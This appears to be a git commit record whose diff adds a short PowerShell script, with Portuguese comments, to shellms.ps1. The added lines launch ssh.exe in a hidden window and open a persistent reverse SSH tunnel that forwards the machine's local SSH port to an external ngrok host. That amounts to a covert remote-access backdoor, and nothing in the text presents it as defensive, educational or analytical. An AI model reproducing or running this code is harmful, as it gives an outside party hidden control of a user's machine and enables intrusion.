5f971c025ac1e0436ba6c657b70de019685d0a3a
usermants <sanchezguy@proton.me>
2025-09-03 07:51:45 -0300

    Atualizar o shellms.ps1

--- shellms.ps1
+++ shellms.ps1
@@ -1,3 +1,10 @@
+# Caminho absoluto do SSH
+$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"
 
+# Comando SSH
+$sshArgs = "-o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 2222:localhost:22 u0_a416@0.tcp.sa.ngrok.io -p 19624 -N"
+
+# Executa SSH em processo invisível
+Start-Process -FilePath $sshPath -ArgumentList $sshArgs -WindowStyle Hidden
 
 
